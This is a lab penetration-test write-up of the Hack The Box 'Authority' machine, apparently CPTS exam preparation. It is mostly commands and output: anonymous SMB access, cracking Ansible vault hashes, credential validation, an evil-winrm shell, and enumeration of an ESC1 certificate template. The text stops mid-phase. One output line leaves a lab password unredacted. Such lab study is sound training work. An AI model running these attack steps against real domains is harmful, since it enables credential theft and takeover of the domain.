
+++
title = "Authority-CPTS-Prep-Box-Writeup.md"
date = 2026-02-20T00:00:00Z
draft = false
description = "Authority is a medium-difficulty Windows machine highlighting misconfigurations, password reuse, exposed credentials on shares, and how default Active Directory settings (MachineAccountQuota) combined with vulnerable AD CS certificate templates (ESC1) can lead to full domain compromise"
tags = ["CPTS", "HTB", "Authority", "CPTS Prep", "Active Directory", "Ansible Vault", "AD CS", "ESC1", "MachineAccountQuota", "RBCD"]
+++

## Executive Summary

During November 2025, a simulated penetration test was conducted against the Windows domain "authority.htb" (`10.129.20.165`). The objective was to evaluate the security posture of the target and identify potential escalation paths to full domain compromise through misconfigurations and credential exposure.

The assessment successfully demonstrated a complete attack chain, moving from anonymous access to domain administrator privileges. The following key findings were identified:

- **Anonymous SMB Access:** The `Development` SMB share was accessible without authentication, containing Ansible playbooks and configuration files with embedded credentials.

- **Ansible Vault Credentials:** Multiple Ansible vault-encrypted strings were discovered in configuration files. The vault password was cracked, revealing credentials for `svc_pwm` and `svc_ldap`.

- **PWM Application Discovery:** A PWM (Password Web Management) application was discovered on port 8443, which when configured with the recovered LDAP credentials leaked the `svc_ldap` password in cleartext.

- **AD CS Enumeration:** Using the `svc_ldap` account, certificate templates were enumerated, revealing the `CorpVPN` template vulnerable to **ESC1** (enrollee supplies subject and allows client authentication).

- **MachineAccountQuota Abuse:** The domain had the default MachineAccountQuota of 10, allowing any authenticated user to add a computer account. A new machine account `POOP$` was created.

- **Certificate Request as Administrator:** Using the new machine account, a certificate was requested from the `CorpVPN` template with the UPN set to `administrator@authority.htb`, successfully obtaining a certificate for the Domain Administrator.

- **LDAP Shell Access:** The obtained certificate was used with PassTheCert to gain an LDAP shell, where `svc_ldap` was added to the `Administrators` group.

- **Resource-Based Constrained Delegation (RBCD):** With elevated privileges, RBCD was configured to allow the `POOP$` machine account to impersonate users on the domain controller.

- **Domain Compromise:** Using RBCD, a service ticket for `Administrator` was requested and used with secretsdump to extract all domain hashes, achieving full domain compromise.

**Impact:**  
This chain of exploits resulted in complete compromise of the Active Directory domain. An attacker with anonymous share access was able to escalate to domain administrator by chaining together exposed credentials, default Active Directory settings, and a vulnerable certificate template.

**Recommendations:**

- **Secure SMB Shares:** Remove anonymous access to sensitive shares containing configuration files and credentials.
- **Secure Ansible Vault Usage:** Use strong vault passwords and avoid storing vault-encrypted strings in publicly accessible locations.
- **Patch AD CS:** Review certificate templates for ESC1 vulnerabilities (enrollee-supplied subjects with client authentication). Disable or secure vulnerable templates.
- **Reduce MachineAccountQuota:** Set MachineAccountQuota to 0 unless explicitly required for legitimate use cases.
- **Monitor Certificate Requests:** Implement logging and monitoring for anomalous certificate requests, especially those requesting administrator UPNs.
- **Principle of Least Privilege:** Regularly audit group memberships and remove unnecessary administrative rights.

## About

Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.

## Detailed Walkthrough

### Phase 1: Initial Access and Network Reconnaissance

**1. DNS Enumeration**  
The assessment began with DNS enumeration to identify domain information.

```bash
# DNS enumeration
❯ dig any authority.htb @10.129.20.165

; <<>> DiG 9.18.41-1~deb12u1-Debian <<>> any authority.htb @10.129.20.165
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5052
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 9, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;authority.htb.                 IN      ANY

;; ANSWER SECTION:
authority.htb.          600     IN      A       10.129.20.165
authority.htb.          600     IN      A       10.129.229.30
authority.htb.          600     IN      A       10.129.229.56
authority.htb.          3600    IN      NS      authority.authority.htb.
authority.htb.          3600    IN      SOA     authority.authority.htb. hostmaster.htb.corp. 175 900 600 86400 3600
authority.htb.          600     IN      AAAA    dead:beef::fe67:a0f1:3983:e9a7
authority.htb.          600     IN      AAAA    dead:beef::92c8:2739:df2d:e622
authority.htb.          600     IN      AAAA    dead:beef::24f
authority.htb.          600     IN      AAAA    dead:beef::a7

;; ADDITIONAL SECTION:
authority.authority.htb. 3600   IN      A       10.129.20.165
authority.authority.htb. 3600   IN      AAAA    dead:beef::92c8:2739:df2d:e622

;; Query time: 253 msec
;; SERVER: 10.129.20.165#53(10.129.20.165) (TCP)
;; WHEN: Fri Nov 28 01:39:26 +07 2025
;; MSG SIZE  rcvd: 325

```
**Findings:** The domain controller was identified at `10.129.20.165` with the domain name `authority.htb`.

**2. Network Scanning**  
A comprehensive port scan was performed to identify all accessible services.

```bash 

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-27 15:40:34Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-11-27T15:41:38+00:00; -3h00m01s from scanner time.
445/tcp   open   microsoft-ds?
595/tcp   closed cab-protocol
636/tcp   open   ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-27T15:41:39+00:00; -3h00m01s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-11-27T15:41:38+00:00; -3h00m01s from scanner time.
3269/tcp  open   ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-11-27T15:41:39+00:00; -3h00m01s from scanner time.
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open   ssl/https-alt
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 27 Nov 2025 15:40:43 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 27 Nov 2025 15:40:41 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Thu, 27 Nov 2025 15:40:41 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Thu, 27 Nov 2025 15:40:49 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2025-11-25T15:34:18
|_Not valid after:  2027-11-28T03:12:42
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp closed unknown
49673/tcp open   msrpc         Microsoft Windows RPC
49688/tcp closed unknown
49689/tcp closed unknown
49691/tcp open   msrpc         Microsoft Windows RPC
49692/tcp closed unknown
49700/tcp closed unknown
49706/tcp closed unknown
49710/tcp closed unknown
49730/tcp closed unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=11/28%Time=69289B2A%P=x86_64-pc-linu
<REDACTED> 
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-11-27T15:41:30
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: -3h00m01s, deviation: 0s, median: -3h00m01s


```
**Findings:** The scan revealed a Windows Domain Controller with standard AD ports, plus additional services including:

- HTTP (80/tcp) - IIS web server
    
- HTTPS (8443/tcp) - PWM (Password Web Management) application
    
- SMB (445/tcp)
    
- WinRM (5985/tcp)

### Phase 2: Anonymous SMB Share Enumeration

**3. Anonymous SMB Access**  
SMB shares were enumerated without authentication.

**4. Share Contents Exploration**  
The `Development` share contained Ansible automation folders for ADCS, LDAP, PWM, and SHARE configurations.

```bash
 smbclient.py -no-pass authority.htb -dc-ip 10.129.20.165

# use Development
# tree
/Automation/Ansible
/Automation/Ansible/ADCS
/Automation/Ansible/LDAP
/Automation/Ansible/PWM
/Automation/Ansible/SHARE
/Automation/Ansible/ADCS/.ansible-lint
/Automation/Ansible/ADCS/.yamllint
/Automation/Ansible/ADCS/defaults
/Automation/Ansible/ADCS/LICENSE
/Automation/Ansible/ADCS/meta
/Automation/Ansible/ADCS/molecule
/Automation/Ansible/ADCS/README.md
/Automation/Ansible/ADCS/requirements.txt
/Automation/Ansible/ADCS/requirements.yml
/Automation/Ansible/ADCS/SECURITY.md
/Automation/Ansible/ADCS/tasks
/Automation/Ansible/ADCS/templates
/Automation/Ansible/ADCS/tox.ini
/Automation/Ansible/ADCS/vars
/Automation/Ansible/LDAP/.bin
/Automation/Ansible/LDAP/.travis.yml
/Automation/Ansible/LDAP/defaults
/Automation/Ansible/LDAP/files
/Automation/Ansible/LDAP/handlers
/Automation/Ansible/LDAP/meta
/Automation/Ansible/LDAP/README.md
/Automation/Ansible/LDAP/tasks
/Automation/Ansible/LDAP/templates
/Automation/Ansible/LDAP/TODO.md
/Automation/Ansible/LDAP/Vagrantfile
/Automation/Ansible/LDAP/vars
/Automation/Ansible/PWM/ansible.cfg
/Automation/Ansible/PWM/ansible_inventory
/Automation/Ansible/PWM/defaults
/Automation/Ansible/PWM/handlers
/Automation/Ansible/PWM/meta
/Automation/Ansible/PWM/README.md
/Automation/Ansible/PWM/tasks
/Automation/Ansible/PWM/templates
/Automation/Ansible/SHARE/tasks
/Automation/Ansible/ADCS/defaults/main.yml
/Automation/Ansible/ADCS/meta/main.yml
/Automation/Ansible/ADCS/meta/preferences.yml
/Automation/Ansible/ADCS/molecule/default
/Automation/Ansible/ADCS/tasks/assert.yml
/Automation/Ansible/ADCS/tasks/generate_ca_certs.yml
/Automation/Ansible/ADCS/tasks/init_ca.yml
/Automation/Ansible/ADCS/tasks/main.yml
/Automation/Ansible/ADCS/tasks/requests.yml
/Automation/Ansible/ADCS/templates/extensions.cnf.j2
/Automation/Ansible/ADCS/templates/openssl.cnf.j2
/Automation/Ansible/ADCS/vars/main.yml
/Automation/Ansible/LDAP/.bin/clean_vault
/Automation/Ansible/LDAP/.bin/diff_vault
/Automation/Ansible/LDAP/.bin/smudge_vault
/Automation/Ansible/LDAP/defaults/main.yml
/Automation/Ansible/LDAP/files/pam_mkhomedir
/Automation/Ansible/LDAP/handlers/main.yml
/Automation/Ansible/LDAP/meta/main.yml
/Automation/Ansible/LDAP/tasks/main.yml
/Automation/Ansible/LDAP/templates/ldap_sudo_groups.j2
/Automation/Ansible/LDAP/templates/ldap_sudo_users.j2
/Automation/Ansible/LDAP/templates/sssd.conf.j2
/Automation/Ansible/LDAP/templates/sudo_group.j2
/Automation/Ansible/LDAP/vars/debian.yml
/Automation/Ansible/LDAP/vars/main.yml
/Automation/Ansible/LDAP/vars/redhat.yml
/Automation/Ansible/LDAP/vars/ubuntu-14.04.yml
/Automation/Ansible/PWM/defaults/main.yml
/Automation/Ansible/PWM/handlers/main.yml
/Automation/Ansible/PWM/meta/main.yml
/Automation/Ansible/PWM/tasks/main.yml
/Automation/Ansible/PWM/templates/context.xml.j2
/Automation/Ansible/PWM/templates/tomcat-users.xml.j2
/Automation/Ansible/SHARE/tasks/main.yml
/Automation/Ansible/ADCS/molecule/default/converge.yml
/Automation/Ansible/ADCS/molecule/default/molecule.yml
/Automation/Ansible/ADCS/molecule/default/prepare.yml
Finished - 79 files and folders
#

```
**Findings:** The `Development` share was accessible anonymously.
**Findings:** Multiple Ansible playbooks and configuration files were discovered, including YAML files with vault-encrypted strings.

### Phase 3: Ansible Vault Credential Extraction

**5. Vault String Discovery**  
The `main.yml` files in various roles contained vault-encrypted credentials.

```bash
❯ cat main.yml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
<REDACTED> 6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          <REDACTED>
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          <REDACTED>
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764#

 ~honeypoop/HTB/C/Au/03-Attack-Chains                                                                                 ✔ │ root@parrot  22:58:54

```


**Findings:** The file contained three vault-encrypted strings:

- `pwm_admin_login` - Encrypted
    
- `pwm_admin_password` - Encrypted
    
- `ldap_admin_password` - Encrypted
    

**6. Vault Hash Extraction**  
The vault strings were extracted and converted to a format suitable for cracking.

```bash 
❯ ansible2john ldap_admin_password_vault pwm_admin_login_vault pwm_admin_password_vault | tee vault_hashes
ldap_admin_password_vault:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae<REDACTED>
pwm_admin_login_vault:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a4<REDACTED>
pwm_admin_password_vault:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77<REDACTED>

```

**7. Vault Password Cracking**  
The vault hashes were cracked using hashcat with the rockyou wordlist.

```bash 
❯ hashcat vault_hashes /usr/share/wordlists/rockyou.txt --user --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

16900 | Ansible Vault | Password Manager

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

ldap_admin_password_vault:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bda<REDACTED>:<REDACTED>
pwm_admin_login_vault:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a<REDACTED>:<REDACTED>
pwm_admin_password_vault:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77<REDACTED>:<REDACTED>

 ~honeypoop/HTB/C/Au/03-Attack-Chains      
   
```
**Findings:** All three vaults used the same password: `<REDACTED>`.

**8. Vault Decryption**  
The vaults were decrypted using the cracked password.

```bash
❯ cat ldap_admin_password_vault | ansible-vault decrypt
Vault password:
Decryption successful
<REDACTED>#
❯ cat pwm_admin_login_vault | ansible-vault decrypt
Vault password:
Decryption successful
<REDACTED>#
❯ cat pwm_admin_password_vault | ansible-vault decrypt
Vault password:
Decryption successful
<REDACTED>#

 ~honeypoop/HTB/C/Au/03-Attack-Chains   

```

**Findings:** The decrypted credentials revealed:

- `ldap_admin_password`: `<REDACTED>`
    
- `pwm_admin_login`: `svc_pwm#`
    
- `pwm_admin_password`: `<REDACTED>`
    

### Phase 4: PWM Application Exploitation

**9. PWM Web Application Access**  
The PWM application on port 8443 was accessed, presenting a login page for password management.

**10. LDAP Configuration**  
Using the recovered credentials, the PWM application was configured to connect to LDAP. Upon successful connection, the application leaked the LDAP bind password in cleartext.

**Findings:** The LDAP traffic revealed the password for `svc_ldap`: `<REDACTED>`.

### Phase 5: Service Account Access

**11. Credential Validation**  
The `svc_ldap` credentials were validated against the domain.

```bash 
❯ nxc smb 10.129.20.165 -u svc_ldap -p '<REDACTED>'
SMB         10.129.20.165   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.20.165   445    AUTHORITY        [+] authority.htb\svc_ldap:<REDACTED>!
❯ nxc ldap 10.129.20.165 -u svc_ldap -p '<REDACTED>!'
LDAP        10.129.20.165   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.20.165   389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
❯ nxc winrm 10.129.20.165 -u svc_ldap -p '<REDACTED>!'
WINRM       10.129.20.165   5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.129.20.165   5985   AUTHORITY        [+] authority.htb\svc_ldap:<REDACTED>! (Pwn3d!)

 ~honeypoop/HTB/C/Au/03-Attack-Chains       
```

**Findings:** The credentials were valid and provided WinRM access (Pwn3d!).

**12. WinRM Session**  
A WinRM session was established as `svc_ldap`.
```bash 

❯ evil-winrm -i  10.129.20.165 -u svc_ldap -p '<REDACTED>!'


Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /all

USER INFORMATION
----------------

User Name    SID
============ =============================================
htb\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\svc_ldap\Documents>

```

**13. User Enumeration**  
The user's group memberships and privileges were enumerated.
```bash
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> net users svc_ldap /domain
User name                    svc_ldap
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/10/2022 8:29:31 PM
Password expires             Never
Password changeable          8/11/2022 8:29:31 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/5/2023 7:43:09 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
**Findings:** `svc_ldap` was a member of `Remote Management Users` and `Certificate Service DCOM Access` groups.

### Phase 6: AD CS Enumeration

**14. Certificate Template Discovery**  
Using the `svc_ldap` account, certificate templates were enumerated.

```bash 
❯ nxc ldap 10.129.20.165 -u svc_ldap -p '<REDACTED>!' -M certipy-find
LDAP        10.129.20.165   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.20.165   389    AUTHORITY        [+] authority.htb\svc_ldap:<REDACTED>!
CERTIPY-... 10.129.20.165   389    AUTHORITY        Certificate Authorities
CERTIPY-... 10.129.20.165   389    AUTHORITY          0
CERTIPY-... 10.129.20.165   389    AUTHORITY            CA Name                             : AUTHORITY-CA
CERTIPY-... 10.129.20.165   389    AUTHORITY            DNS Name                            : authority.authority.htb
CERTIPY-... 10.129.20.165   389    AUTHORITY            Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
CERTIPY-... 10.129.20.165   389    AUTHORITY            Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
CERTIPY-... 10.129.20.165   389    AUTHORITY            Certificate Validity Start          : 2023-04-24 01:46:26+00:00
CERTIPY-... 10.129.20.165   389    AUTHORITY            Certificate Validity End            : 2123-04-24 01:56:25+00:00
CERTIPY-... 10.129.20.165   389    AUTHORITY            Web Enrollment
CERTIPY-... 10.129.20.165   389    AUTHORITY              HTTP
CERTIPY-... 10.129.20.165   389    AUTHORITY                Enabled                         : False
CERTIPY-... 10.129.20.165   389    AUTHORITY              HTTPS
CERTIPY-... 10.129.20.165   389    AUTHORITY                Enabled                         : False
CERTIPY-... 10.129.20.165   389    AUTHORITY            User Specified SAN                  : Disabled
CERTIPY-... 10.129.20.165   389    AUTHORITY            Request Disposition                 : Issue
CERTIPY-... 10.129.20.165   389    AUTHORITY            Enforce Encryption for Requests     : Enabled
CERTIPY-... 10.129.20.165   389    AUTHORITY            Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
CERTIPY-... 10.129.20.165   389    AUTHORITY            Permissions
CERTIPY-... 10.129.20.165   389    AUTHORITY              Owner                             : AUTHORITY.HTB\Administrators
CERTIPY-... 10.129.20.165   389    AUTHORITY              Access Rights
CERTIPY-... 10.129.20.165   389    AUTHORITY                ManageCa                        : AUTHORITY.HTB\Administrators
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  AUTHORITY.HTB\Domain Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  AUTHORITY.HTB\Enterprise Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY                ManageCertificates              : AUTHORITY.HTB\Administrators
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  AUTHORITY.HTB\Domain Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  AUTHORITY.HTB\Enterprise Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY                Enroll                          : AUTHORITY.HTB\Authenticated Users
CERTIPY-... 10.129.20.165   389    AUTHORITY        Certificate Templates
CERTIPY-... 10.129.20.165   389    AUTHORITY          0
CERTIPY-... 10.129.20.165   389    AUTHORITY            Template Name                       : CorpVPN
CERTIPY-... 10.129.20.165   389    AUTHORITY            Display Name                        : Corp VPN
CERTIPY-... 10.129.20.165   389    AUTHORITY            Certificate Authorities             : AUTHORITY-CA
CERTIPY-... 10.129.20.165   389    AUTHORITY            Enabled                             : True
CERTIPY-... 10.129.20.165   389    AUTHORITY            Client Authentication               : True
CERTIPY-... 10.129.20.165   389    AUTHORITY            Enrollment Agent                    : False
CERTIPY-... 10.129.20.165   389    AUTHORITY            Any Purpose                         : False
CERTIPY-... 10.129.20.165   389    AUTHORITY            Enrollee Supplies Subject           : True
CERTIPY-... 10.129.20.165   389    AUTHORITY            Certificate Name Flag               : EnrolleeSuppliesSubject
CERTIPY-... 10.129.20.165   389    AUTHORITY            Enrollment Flag                     : IncludeSymmetricAlgorithms
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  PublishToDs
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  AutoEnrollmentCheckUserDsCertificate
CERTIPY-... 10.129.20.165   389    AUTHORITY            Private Key Flag                    : ExportableKey
CERTIPY-... 10.129.20.165   389    AUTHORITY            Extended Key Usage                  : Encrypting File System
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  Secure Email
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  Client Authentication
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  Document Signing
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  IP security IKE intermediate
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  IP security use
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  KDC Authentication
CERTIPY-... 10.129.20.165   389    AUTHORITY            Requires Manager Approval           : False
CERTIPY-... 10.129.20.165   389    AUTHORITY            Requires Key Archival               : False
CERTIPY-... 10.129.20.165   389    AUTHORITY            Authorized Signatures Required      : 0
CERTIPY-... 10.129.20.165   389    AUTHORITY            Schema Version                      : 2
CERTIPY-... 10.129.20.165   389    AUTHORITY            Validity Period                     : 20 years
CERTIPY-... 10.129.20.165   389    AUTHORITY            Renewal Period                      : 6 weeks
CERTIPY-... 10.129.20.165   389    AUTHORITY            Minimum RSA Key Length              : 2048
CERTIPY-... 10.129.20.165   389    AUTHORITY            Template Created                    : 2023-03-24T23:48:09+00:00
CERTIPY-... 10.129.20.165   389    AUTHORITY            Template Last Modified              : 2023-03-24T23:48:11+00:00
CERTIPY-... 10.129.20.165   389    AUTHORITY            Permissions
CERTIPY-... 10.129.20.165   389    AUTHORITY              Enrollment Permissions
CERTIPY-... 10.129.20.165   389    AUTHORITY                Enrollment Rights               : AUTHORITY.HTB\Domain Computers
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  AUTHORITY.HTB\Domain Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  AUTHORITY.HTB\Enterprise Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY              Object Control Permissions
CERTIPY-... 10.129.20.165   389    AUTHORITY                Owner                           : AUTHORITY.HTB\Administrator
CERTIPY-... 10.129.20.165   389    AUTHORITY                Full Control Principals         : AUTHORITY.HTB\Domain Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  AUTHORITY.HTB\Enterprise Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY                Write Owner Principals          : AUTHORITY.HTB\Domain Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  AUTHORITY.HTB\Enterprise Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY                Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  AUTHORITY.HTB\Enterprise Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY                Write Property Enroll           : AUTHORITY.HTB\Domain Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY                                                  AUTHORITY.HTB\Enterprise Admins
CERTIPY-... 10.129.20.165   389    AUTHORITY            [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
CERTIPY-... 10.129.20.165   389    AUTHORITY            [!] Vulnerabilities
CERTIPY-... 10.129.20.165   389    AUTHORITY              ESC1                              : Enrollee supplies subject and template allows client authentication.

```
**Findings:** The `CorpVPN` template was enabled and vulnerable to **ESC1**:

- Enrollee supplies subject: `True`
    
- Client Authentication: `True`
    
- Enrollment rights: `Domain Computers`

### Phase 7: MachineAccountQuota Abuse

**15. MachineAccountQuota Check**  
The MachineAccountQuota was checked to determine if new computer accounts could be added.

```bash 
